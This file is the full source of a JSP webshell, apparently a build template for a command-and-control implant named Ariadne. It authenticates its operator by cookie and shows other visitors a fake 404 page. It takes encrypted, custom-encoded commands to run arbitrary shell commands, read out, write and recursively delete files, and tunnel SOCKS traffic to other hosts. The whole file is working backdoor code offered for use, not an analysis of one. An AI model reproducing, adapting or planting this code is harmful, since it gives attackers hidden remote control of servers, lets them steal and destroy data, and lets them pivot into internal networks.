<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.security.*" %>
<%@ page import="java.util.*" %>
<%@ page import="javax.crypto.*" %>
<%@ page import="javax.crypto.spec.*" %>
<%@ page import="javax.xml.parsers.*" %>
<%@ page import="org.w3c.dom.*" %>
<%@ page import="org.xml.sax.InputSource" %>
<%!
    // =========================================================================
    // Ariadne JSP webshell template
    // Tokens replaced at build time.
    // =========================================================================

    // --- Configuration ---
    static final String ARIADNE_UUID = "aa4056f3-ab0c-47e9-a016-3a1d35c81d75";
    static final String ARIADNE_AUTH_METHOD = "cookie";
    static final String ARIADNE_AUTH_NAME = "ARIADNE_SID";
    static final String ARIADNE_AUTH_VALUE = "ariadne-jsp-final";
    static final String ARIADNE_ENCODING = "deformed_base64";
    static final String ARIADNE_DEFORMED_ALPHABET = "kK3t+nNbFgMQIXx9DYvH52JS6LzAdp0qiCo8Ouwm1/WVRylBGZ7hjPasE4rTUefc";
    static final String ARIADNE_STANDARD_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    static final String ARIADNE_ENCRYPTION = "aes256_cbc";
    static final String ARIADNE_AES_KEY = "vC7oyFjd2p0dHVra8ATF/1ah8vFREonHUSjASNbasAE=";
    static final String ARIADNE_REQUEST_TEMPLATE = "form_post";
    static final String ARIADNE_REQUEST_PARAM = "data";
    static final String ARIADNE_CAMOUFLAGE_HTML = "<!DOCTYPE html>\n<html>\n<head><title>404 - File or directory not found.</title>\n<style>body{font-family:\"Segoe UI\",Tahoma,Arial,sans-serif;margin:0;background:#eee}\n.container{max-width:800px;margin:50px auto;background:#fff;border:1px solid #ddd;padding:40px}\nh1{color:#c00;font-size:24px;border-bottom:1px solid #ccc;padding-bottom:10px}\nh2{color:#555;font-size:16px;font-weight:normal}\np{color:#777;font-size:13px;line-height:1.6}</style></head>\n<body><div class=\"container\">\n<h1>Server Error</h1>\n<h2>404 - File or directory not found.</h2>\n<p>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>\n</div></body></html>\n";
    static final int ARIADNE_RESPONSE_STATUS = 200;
    static final String ARIADNE_RESPONSE_CT = "text/html";
    static final boolean ARIADNE_ENABLE_SOCKS = false;
    static final boolean ARIADNE_ENABLE_P2P_HTTP = false;
    static final boolean ARIADNE_ENABLE_P2P_TCP = false;
    static final int ARIADNE_TCP_PORT = 7443;
    static final boolean ARIADNE_DEBUG = true;

    // --- SOCKS tunnel storage (keyed by mark) ---
    static final Map<String, Socket> ariadneTunnels =
        Collections.synchronizedMap(new HashMap<String, Socket>());

    // --- Tracked working directory (Java cannot chdir) ---
    static volatile String ariadneWorkDir = System.getProperty("user.dir");

    // =====================================================================
    // ENCODING / DECODING
    // =====================================================================

    static String ariadneEncode(byte[] data) {
        if ("deformed_base64".equals(ARIADNE_ENCODING)) {
            String standard = Base64.getEncoder().encodeToString(data);
            return translateChars(standard, ARIADNE_STANDARD_ALPHABET, ARIADNE_DEFORMED_ALPHABET);
        } else if ("standard_base64".equals(ARIADNE_ENCODING)) {
            return Base64.getEncoder().encodeToString(data);
        } else if ("hex".equals(ARIADNE_ENCODING)) {
            return bytesToHex(data);
        }
        return Base64.getEncoder().encodeToString(data);
    }

    static byte[] ariadneDecode(String encoded) {
        if ("deformed_base64".equals(ARIADNE_ENCODING)) {
            String standard = translateChars(encoded, ARIADNE_DEFORMED_ALPHABET, ARIADNE_STANDARD_ALPHABET);
            return Base64.getDecoder().decode(standard);
        } else if ("standard_base64".equals(ARIADNE_ENCODING)) {
            return Base64.getDecoder().decode(encoded);
        } else if ("hex".equals(ARIADNE_ENCODING)) {
            return hexToBytes(encoded);
        }
        return Base64.getDecoder().decode(encoded);
    }

    static String translateChars(String input, String from, String to) {
        char[] result = input.toCharArray();
        for (int i = 0; i < result.length; i++) {
            int idx = from.indexOf(result[i]);
            if (idx >= 0) {
                result[i] = to.charAt(idx);
            }
        }
        return new String(result);
    }

    static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            sb.append(String.format("%02x", b & 0xff));
        }
        return sb.toString();
    }

    static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

    // =====================================================================
    // ENCRYPTION / DECRYPTION (AES-256-CBC + HMAC-SHA256)
    // =====================================================================

    static byte[] ariadneEncrypt(byte[] plaintext) throws Exception {
        if (!"aes256_cbc".equals(ARIADNE_ENCRYPTION) || ARIADNE_AES_KEY.isEmpty()) {
            return plaintext;
        }

        byte[] key = Base64.getDecoder().decode(ARIADNE_AES_KEY);

        // Random 16-byte IV
        byte[] iv = new byte[16];
        SecureRandom sr = new SecureRandom();
        sr.nextBytes(iv);

        // AES-256-CBC encrypt with PKCS5Padding (equivalent to PKCS7 for 16-byte blocks)
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        byte[] ciphertext = cipher.doFinal(plaintext);

        // blob = IV || ciphertext
        byte[] blob = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, blob, 0, iv.length);
        System.arraycopy(ciphertext, 0, blob, iv.length, ciphertext.length);

        // HMAC-SHA256 over blob
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(key, "HmacSHA256"));
        byte[] hmac = mac.doFinal(blob);

        // result = blob || hmac(32)
        byte[] result = new byte[blob.length + hmac.length];
        System.arraycopy(blob, 0, result, 0, blob.length);
        System.arraycopy(hmac, 0, result, blob.length, hmac.length);

        return result;
    }

    static byte[] ariadneDecrypt(byte[] data) throws Exception {
        if (!"aes256_cbc".equals(ARIADNE_ENCRYPTION) || ARIADNE_AES_KEY.isEmpty()) {
            return data;
        }

        byte[] key = Base64.getDecoder().decode(ARIADNE_AES_KEY);

        if (data.length < 48) { // 16 IV + min 16 ciphertext + 32 HMAC minimum
            return null;
        }

        // Split: iv_and_ct = data[0..-32], hmac_received = data[-32..]
        byte[] ivAndCt = Arrays.copyOfRange(data, 0, data.length - 32);
        byte[] hmacReceived = Arrays.copyOfRange(data, data.length - 32, data.length);

        // Verify HMAC
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(key, "HmacSHA256"));
        byte[] hmacComputed = mac.doFinal(ivAndCt);

        if (!MessageDigest.isEqual(hmacComputed, hmacReceived)) {
            return null;
        }

        // Decrypt
        byte[] iv = Arrays.copyOfRange(ivAndCt, 0, 16);
        byte[] ciphertext = Arrays.copyOfRange(ivAndCt, 16, ivAndCt.length);

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);

        return cipher.doFinal(ciphertext);
    }

    // =====================================================================
    // AUTHENTICATION
    // =====================================================================

    static boolean ariadneAuthenticate(HttpServletRequest req) {
        String value = "";

        if ("cookie".equals(ARIADNE_AUTH_METHOD)) {
            Cookie[] cookies = req.getCookies();
            if (cookies != null) {
                for (Cookie c : cookies) {
                    if (ARIADNE_AUTH_NAME.equals(c.getName())) {
                        value = c.getValue();
                        break;
                    }
                }
            }
        } else if ("header".equals(ARIADNE_AUTH_METHOD)) {
            String hdr = req.getHeader(ARIADNE_AUTH_NAME);
            if (hdr != null) {
                value = hdr;
            }
        } else if ("parameter".equals(ARIADNE_AUTH_METHOD)) {
            String param = req.getParameter(ARIADNE_AUTH_NAME);
            if (param != null) {
                value = param;
            }
        }

        // Constant-time comparison
        return MessageDigest.isEqual(
            ARIADNE_AUTH_VALUE.getBytes(StandardCharsets.UTF_8),
            value.getBytes(StandardCharsets.UTF_8)
        );
    }

    // =====================================================================
    // REQUEST BODY EXTRACTION
    // =====================================================================

    static String ariadneExtractPayload(HttpServletRequest req) throws Exception {
        if ("form_post".equals(ARIADNE_REQUEST_TEMPLATE)) {
            String param = req.getParameter(ARIADNE_REQUEST_PARAM);
            return param != null ? param : "";
        } else if ("json_api".equals(ARIADNE_REQUEST_TEMPLATE)) {
            String body = readRequestBody(req);
            return jsonExtractString(body, ARIADNE_REQUEST_PARAM);
        } else if ("image_data".equals(ARIADNE_REQUEST_TEMPLATE)) {
            String val = req.getParameter(ARIADNE_REQUEST_PARAM);
            if (val == null) val = "";
            String prefix = "data:image/png;base64,";
            if (val.startsWith(prefix)) {
                return val.substring(prefix.length());
            }
            return val;
        } else if ("xml_soap".equals(ARIADNE_REQUEST_TEMPLATE)) {
            String body = readRequestBody(req);
            return xmlSoapExtract(body, ARIADNE_REQUEST_PARAM);
        }

        // Fallback: raw body
        return readRequestBody(req);
    }

    static String readRequestBody(HttpServletRequest req) throws Exception {
        StringBuilder sb = new StringBuilder();
        BufferedReader reader = req.getReader();
        char[] buf = new char[4096];
        int n;
        while ((n = reader.read(buf)) > 0) {
            sb.append(buf, 0, n);
        }
        return sb.toString();
    }

    // Simple JSON string value extraction (no external library needed)
    static String jsonExtractString(String json, String key) {
        String searchKey = "\"" + key + "\"";
        int keyIdx = json.indexOf(searchKey);
        if (keyIdx < 0) return "";

        int colonIdx = json.indexOf(':', keyIdx + searchKey.length());
        if (colonIdx < 0) return "";

        // Skip whitespace after colon
        int valStart = colonIdx + 1;
        while (valStart < json.length() && Character.isWhitespace(json.charAt(valStart))) {
            valStart++;
        }

        if (valStart >= json.length()) return "";

        if (json.charAt(valStart) == '"') {
            // string value: find closing quote, handle escapes
            int valEnd = valStart + 1;
            while (valEnd < json.length()) {
                char ch = json.charAt(valEnd);
                if (ch == '\\') {
                    valEnd += 2; // skip escaped char
                    continue;
                }
                if (ch == '"') break;
                valEnd++;
            }
            return json.substring(valStart + 1, valEnd)
                       .replace("\\\"", "\"")
                       .replace("\\\\", "\\")
                       .replace("\\/", "/");
        } else {
            // Non-string value (number, bool, null)
            int valEnd = valStart;
            while (valEnd < json.length() && json.charAt(valEnd) != ','
                   && json.charAt(valEnd) != '}' && json.charAt(valEnd) != ']'
                   && !Character.isWhitespace(json.charAt(valEnd))) {
                valEnd++;
            }
            return json.substring(valStart, valEnd);
        }
    }

    // XML SOAP extraction using DocumentBuilder
    static String xmlSoapExtract(String xmlBody, String paramName) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            factory.setNamespaceAware(true);
            DocumentBuilder builder = factory.newDocumentBuilder();
            org.w3c.dom.Document doc = builder.parse(
                new InputSource(new StringReader(xmlBody))
            );

            // Look for soap:Body or Body element
            NodeList bodyNodes = doc.getElementsByTagNameNS(
                "http://schemas.xmlsoap.org/soap/envelope/", "Body"
            );
            if (bodyNodes.getLength() == 0) {
                bodyNodes = doc.getElementsByTagNameNS(
                    "http://www.w3.org/2003/05/soap-envelope", "Body"
                );
            }
            if (bodyNodes.getLength() == 0) {
                bodyNodes = doc.getElementsByTagName("Body");
            }

            if (bodyNodes.getLength() > 0) {
                org.w3c.dom.Element body = (org.w3c.dom.Element) bodyNodes.item(0);
                NodeList children = body.getChildNodes();
                for (int i = 0; i < children.getLength(); i++) {
                    org.w3c.dom.Node child = children.item(i);
                    if (child.getNodeType() == org.w3c.dom.Node.ELEMENT_NODE
                        && paramName.equals(child.getLocalName())) {
                        return child.getTextContent();
                    }
                }
            }
        } catch (Exception e) {
            // parse error, return empty
        }
        return "";
    }

    // =====================================================================
    // COMMAND HANDLERS
    // =====================================================================

    static String cmdCheckin(String taskId) {
        String hostname = "";
        try {
            hostname = InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            hostname = "unknown";
        }

        String os = System.getProperty("os.name", "unknown") + " "
                   + System.getProperty("os.version", "");
        String user = System.getProperty("user.name", "unknown");

        String domain = "";
        try {
            // Try to get domain from environment
            String d = System.getenv("USERDOMAIN");
            if (d == null) d = System.getenv("DOMAINNAME");
            if (d != null) domain = d;
        } catch (Exception e) { /* ignore */ }

        long pid = -1;
        try {
            pid = ProcessHandle.current().pid();
        } catch (Exception e) {
            // Fallback for older JVMs
            String procName = java.lang.management.ManagementFactory.getRuntimeMXBean().getName();
            try {
                pid = Long.parseLong(procName.split("@")[0]);
            } catch (Exception e2) { /* ignore */ }
        }

        String arch = System.getProperty("os.arch", "unknown");
        String cwd = ariadneWorkDir;

        String ips = "";
        try {
            StringBuilder ipSb = new StringBuilder();
            Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
            while (nets.hasMoreElements()) {
                NetworkInterface ni = nets.nextElement();
                if (ni.isLoopback() || !ni.isUp()) continue;
                Enumeration<InetAddress> addrs = ni.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress addr = addrs.nextElement();
                    if (addr instanceof Inet4Address) {
                        if (ipSb.length() > 0) ipSb.append(",");
                        ipSb.append(addr.getHostAddress());
                    }
                }
            }
            ips = ipSb.toString();
        } catch (Exception e) { /* ignore */ }

        return "0|" + taskId + "|" + hostname + "|" + os + "|" + user + "|"
               + domain + "|" + pid + "|" + arch + "|" + cwd + "|" + ips;
    }

    static String cmdShell(String taskId, String command) {
        try {
            boolean isWindows = System.getProperty("os.name", "")
                                      .toLowerCase().contains("win");
            ProcessBuilder pb;
            if (isWindows) {
                pb = new ProcessBuilder("cmd.exe", "/c", command);
            } else {
                pb = new ProcessBuilder("/bin/sh", "-c", command);
            }
            pb.directory(new File(ariadneWorkDir));
            pb.redirectErrorStream(true);

            Process proc = pb.start();
            InputStream is = proc.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = is.read(buf)) != -1) {
                baos.write(buf, 0, n);
            }
            proc.waitFor();

            String output = baos.toString("UTF-8");
            // Trim trailing newlines
            while (output.endsWith("\n") || output.endsWith("\r")) {
                output = output.substring(0, output.length() - 1);
            }

            return "0|" + taskId + "|" + output;
        } catch (Exception e) {
            return "1|" + taskId + "|Shell execution failed: " + e.getMessage();
        }
    }

    static String cmdLs(String taskId, String path) {
        File dir = new File(path);
        if (!dir.isAbsolute()) {
            dir = new File(ariadneWorkDir, path);
        }

        if (!dir.isDirectory()) {
            return "1|" + taskId + "|Not a directory: " + dir.getAbsolutePath();
        }

        File[] entries = dir.listFiles();
        if (entries == null) {
            return "1|" + taskId + "|Cannot read directory: " + dir.getAbsolutePath();
        }

        StringBuilder jsonArr = new StringBuilder("[");
        boolean first = true;
        for (File f : entries) {
            if (!first) jsonArr.append(",");
            first = false;
            jsonArr.append("{");
            jsonArr.append("\"name\":").append(jsonQuote(f.getName())).append(",");
            jsonArr.append("\"is_file\":").append(f.isFile()).append(",");
            jsonArr.append("\"size\":").append(f.isFile() ? f.length() : 0).append(",");
            // Java doesn't have Unix permissions portably; use rwx flags
            String perms = (f.canRead() ? "r" : "-")
                         + (f.canWrite() ? "w" : "-")
                         + (f.canExecute() ? "x" : "-");
            jsonArr.append("\"permissions\":").append(jsonQuote(perms)).append(",");
            long mtime = f.lastModified();
            String mtimeStr = mtime > 0
                ? new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new java.util.Date(mtime))
                : "";
            jsonArr.append("\"modify_time\":").append(jsonQuote(mtimeStr));
            jsonArr.append("}");
        }
        jsonArr.append("]");

        String hostname = "";
        try {
            hostname = InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            hostname = "unknown";
        }

        String parentPath;
        try {
            parentPath = dir.getCanonicalPath();
        } catch (Exception e) {
            parentPath = dir.getAbsolutePath();
        }

        String jsonResult = "{\"host\":" + jsonQuote(hostname)
                          + ",\"parent_path\":" + jsonQuote(parentPath)
                          + ",\"files\":" + jsonArr.toString() + "}";

        return "0|" + taskId + "|" + jsonResult;
    }

    static String cmdCd(String taskId, String path) {
        File target;
        if (new File(path).isAbsolute()) {
            target = new File(path);
        } else {
            target = new File(ariadneWorkDir, path);
        }

        try {
            String canonical = target.getCanonicalPath();
            if (new File(canonical).isDirectory()) {
                ariadneWorkDir = canonical;
                return "0|" + taskId + "|" + ariadneWorkDir;
            } else {
                return "1|" + taskId + "|Cannot change directory to: " + path;
            }
        } catch (Exception e) {
            return "1|" + taskId + "|Cannot change directory to: " + path;
        }
    }

    static String cmdPwd(String taskId) {
        return "0|" + taskId + "|" + ariadneWorkDir;
    }

    static String cmdDownload(String taskId, String filepath) {
        File f;
        if (new File(filepath).isAbsolute()) {
            f = new File(filepath);
        } else {
            f = new File(ariadneWorkDir, filepath);
        }

        if (!f.exists()) {
            return "1|" + taskId + "|File not found: " + filepath;
        }
        if (!f.canRead()) {
            return "1|" + taskId + "|File not readable: " + filepath;
        }

        try {
            byte[] contents = java.nio.file.Files.readAllBytes(f.toPath());
            String encoded = Base64.getEncoder().encodeToString(contents);
            String filename = f.getName();
            String realPath;
            try {
                realPath = f.getCanonicalPath();
            } catch (Exception e) {
                realPath = f.getAbsolutePath();
            }

            String json = "{\"filename\":" + jsonQuote(filename)
                         + ",\"filepath\":" + jsonQuote(realPath)
                         + ",\"size\":" + contents.length
                         + ",\"data\":" + jsonQuote(encoded) + "}";

            return "0|" + taskId + "|" + json;
        } catch (Exception e) {
            return "1|" + taskId + "|Failed to read file: " + e.getMessage();
        }
    }

    static String cmdUpload(String taskId, String remotePath, String b64Content) {
        File f;
        if (new File(remotePath).isAbsolute()) {
            f = new File(remotePath);
        } else {
            f = new File(ariadneWorkDir, remotePath);
        }

        try {
            File parent = f.getParentFile();
            if (parent != null && !parent.exists()) {
                parent.mkdirs();
            }

            byte[] content = Base64.getDecoder().decode(b64Content);
            java.nio.file.Files.write(f.toPath(), content);

            return "0|" + taskId + "|Uploaded " + content.length + " bytes to " + f.getAbsolutePath();
        } catch (Exception e) {
            return "1|" + taskId + "|Failed to write file: " + e.getMessage();
        }
    }

    static String cmdRm(String taskId, String path) {
        File f;
        if (new File(path).isAbsolute()) {
            f = new File(path);
        } else {
            f = new File(ariadneWorkDir, path);
        }

        if (!f.exists()) {
            return "1|" + taskId + "|Path not found: " + path;
        }

        boolean success;
        if (f.isDirectory()) {
            success = deleteRecursive(f);
        } else {
            success = f.delete();
        }

        if (success) {
            return "0|" + taskId + "|Removed: " + path;
        }
        return "1|" + taskId + "|Failed to remove: " + path;
    }

    static boolean deleteRecursive(File dir) {
        File[] entries = dir.listFiles();
        if (entries != null) {
            for (File entry : entries) {
                if (entry.isDirectory()) {
                    deleteRecursive(entry);
                } else {
                    entry.delete();
                }
            }
        }
        return dir.delete();
    }

    // =====================================================================
    // SOCKS TUNNEL HANDLERS
    // =====================================================================

    static String tunnelConnect(String mark, String data) {
        try {
            String target = new String(Base64.getDecoder().decode(data), StandardCharsets.UTF_8);
            String[] parts = target.split(":", 2);
            if (parts.length != 2) {
                return "1|Connection target invalid";
            }

            String ip = parts[0];
            int port = Integer.parseInt(parts[1]);

            Socket sock = new Socket();
            sock.connect(new InetSocketAddress(ip, port), 10000);
            sock.setSoTimeout(100); // non-blocking read timeout

            ariadneTunnels.put(mark, sock);
            return "0|Connected";
        } catch (Exception e) {
            return "1|Connection failed: " + e.getMessage();
        }
    }

    static String tunnelForward(String mark, String data) {
        Socket sock = ariadneTunnels.get(mark);
        if (sock == null) {
            return "1|No tunnel session: " + mark;
        }

        try {
            byte[] raw = Base64.getDecoder().decode(data);
            OutputStream os = sock.getOutputStream();
            os.write(raw);
            os.flush();
            return "0|" + raw.length;
        } catch (Exception e) {
            ariadneTunnels.remove(mark);
            try { sock.close(); } catch (Exception ignored) {}
            return "1|Write failed";
        }
    }

    static String tunnelRead(String mark) {
        Socket sock = ariadneTunnels.get(mark);
        if (sock == null) {
            return "1|No tunnel session: " + mark;
        }

        try {
            InputStream is = sock.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            try {
                int n;
                while ((n = is.read(buf)) > 0) {
                    baos.write(buf, 0, n);
                    if (baos.size() >= 524288) break; // 512KB cap
                }
            } catch (java.net.SocketTimeoutException e) {
                // Expected for non-blocking reads
            }

            if (sock.isClosed() || sock.isInputShutdown()) {
                ariadneTunnels.remove(mark);
                try { sock.close(); } catch (Exception ignored) {}
            }

            String encoded = Base64.getEncoder().encodeToString(baos.toByteArray());
            return "0|" + encoded;
        } catch (Exception e) {
            ariadneTunnels.remove(mark);
            try { sock.close(); } catch (Exception ignored) {}
            return "1|Read failed: " + e.getMessage();
        }
    }

    static String tunnelDisconnect(String mark) {
        Socket sock = ariadneTunnels.remove(mark);
        if (sock != null) {
            try { sock.close(); } catch (Exception ignored) {}
        }
        return "0|Disconnected";
    }

    // =====================================================================
    // P2P MESSAGE QUEUE (file-based)
    // =====================================================================

    static File getP2PQueueFile() {
        String tmpDir = System.getProperty("java.io.tmpdir");
        try {
            String hash = bytesToHex(
                MessageDigest.getInstance("MD5").digest(
                    ARIADNE_UUID.getBytes(StandardCharsets.UTF_8)
                )
            );
            return new File(tmpDir, ".ariadne_p2p_" + hash);
        } catch (Exception e) {
            return new File(tmpDir, ".ariadne_p2p_" + ARIADNE_UUID);
        }
    }

    static void p2pQueuePush(String message) {
        File qf = getP2PQueueFile();
        try {
            java.nio.file.Files.write(
                qf.toPath(),
                (message + "\n").getBytes(StandardCharsets.UTF_8),
                java.nio.file.StandardOpenOption.CREATE,
                java.nio.file.StandardOpenOption.APPEND
            );
        } catch (Exception e) { /* ignore */ }
    }

    static String p2pQueueDrain() {
        File qf = getP2PQueueFile();
        if (!qf.exists()) return "";
        try {
            byte[] data = java.nio.file.Files.readAllBytes(qf.toPath());
            // Truncate the file
            java.nio.file.Files.write(qf.toPath(), new byte[0]);
            return new String(data, StandardCharsets.UTF_8).trim();
        } catch (Exception e) {
            return "";
        }
    }

    // =====================================================================
    // UTILITY: JSON string quoting
    // =====================================================================

    static String jsonQuote(String s) {
        if (s == null) return "\"\"";
        StringBuilder sb = new StringBuilder("\"");
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"':  sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                case '\b': sb.append("\\b"); break;
                case '\f': sb.append("\\f"); break;
                default:
                    if (c < 0x20) {
                        sb.append(String.format("\\u%04x", (int) c));
                    } else {
                        sb.append(c);
                    }
            }
        }
        sb.append("\"");
        return sb.toString();
    }
%>
<%
    // =========================================================================
    // MAIN DISPATCH
    // =========================================================================

    // --- Authentication ---
    if (!ariadneAuthenticate(request)) {
        response.setStatus(ARIADNE_RESPONSE_STATUS == 200 ? 404 : ARIADNE_RESPONSE_STATUS);
        out.print(ARIADNE_CAMOUFLAGE_HTML);
        return;
    }

    // --- Extract payload ---
    String encodedPayload = ariadneExtractPayload(request);
    if (encodedPayload == null || encodedPayload.isEmpty()) {
        response.setStatus(ARIADNE_RESPONSE_STATUS);
        response.setContentType(ARIADNE_RESPONSE_CT);
        out.print(ARIADNE_CAMOUFLAGE_HTML);
        return;
    }

    // --- Decode ---
    byte[] rawBytes = ariadneDecode(encodedPayload);

    // --- Decrypt ---
    byte[] plaintextBytes = ariadneDecrypt(rawBytes);
    if (plaintextBytes == null) {
        response.setStatus(500);
        return;
    }

    String plaintext = new String(plaintextBytes, StandardCharsets.UTF_8);

    // --- Parse pipe-delimited command ---
    String[] parts = plaintext.split("\\|", -1);
    String action = parts.length > 0 ? parts[0] : "";
    String taskId = parts.length > 1 ? parts[1] : "";

    String cmdResponse = "";

    // --- Command dispatch ---
    if ("checkin".equals(action)) {
        cmdResponse = cmdCheckin(taskId);

    } else if ("shell".equals(action)) {
        String command = "";
        if (parts.length > 2) {
            StringBuilder sb = new StringBuilder();
            for (int i = 2; i < parts.length; i++) {
                if (i > 2) sb.append("|");
                sb.append(parts[i]);
            }
            command = sb.toString();
        }
        cmdResponse = cmdShell(taskId, command);

    } else if ("ls".equals(action)) {
        String path = parts.length > 2 ? parts[2] : ".";
        cmdResponse = cmdLs(taskId, path);

    } else if ("cd".equals(action)) {
        String path = parts.length > 2 ? parts[2] : ".";
        cmdResponse = cmdCd(taskId, path);

    } else if ("pwd".equals(action)) {
        cmdResponse = cmdPwd(taskId);

    } else if ("download".equals(action)) {
        String filepath = parts.length > 2 ? parts[2] : "";
        cmdResponse = cmdDownload(taskId, filepath);

    } else if ("upload".equals(action)) {
        String remotePath = parts.length > 2 ? parts[2] : "";
        String b64Content = parts.length > 3 ? parts[3] : "";
        cmdResponse = cmdUpload(taskId, remotePath, b64Content);

    } else if ("rm".equals(action)) {
        String path = parts.length > 2 ? parts[2] : "";
        cmdResponse = cmdRm(taskId, path);

    } else if ("tunnel".equals(action)) {
        if (ARIADNE_ENABLE_SOCKS) {
            String mark = parts.length > 1 ? parts[1] : "";
            String tunnelCmd = parts.length > 2 ? parts[2] : "";
            String tunnelData = parts.length > 3 ? parts[3] : "";
            if ("CONNECT".equals(tunnelCmd)) {
                cmdResponse = tunnelConnect(mark, tunnelData);
            } else if ("FORWARD".equals(tunnelCmd)) {
                cmdResponse = tunnelForward(mark, tunnelData);
            } else if ("READ".equals(tunnelCmd)) {
                cmdResponse = tunnelRead(mark);
            } else if ("DISCONNECT".equals(tunnelCmd)) {
                cmdResponse = tunnelDisconnect(mark);
            } else {
                cmdResponse = "1|Unknown tunnel command: " + tunnelCmd;
            }
        } else {
            cmdResponse = "1|SOCKS tunneling not enabled";
        }

    } else if ("poll".equals(action) || "poll_p2p".equals(action)) {
        String p2pData = "";
        if (ARIADNE_ENABLE_P2P_HTTP && "poll_p2p".equals(action)) {
            p2pData = p2pQueueDrain();
        }
        cmdResponse = "0|poll|" + p2pData;

    } else {
        cmdResponse = "1|" + taskId + "|Unknown action: " + action;
    }

    // --- Encrypt ---
    byte[] encrypted = ariadneEncrypt(cmdResponse.getBytes(StandardCharsets.UTF_8));

    // --- Encode ---
    String encodedResponse = ariadneEncode(encrypted);

    // --- Output ---
    response.setStatus(ARIADNE_RESPONSE_STATUS);
    response.setContentType(ARIADNE_RESPONSE_CT);
    out.print("<span id=\"r\">" + encodedResponse + "</span>");
%>
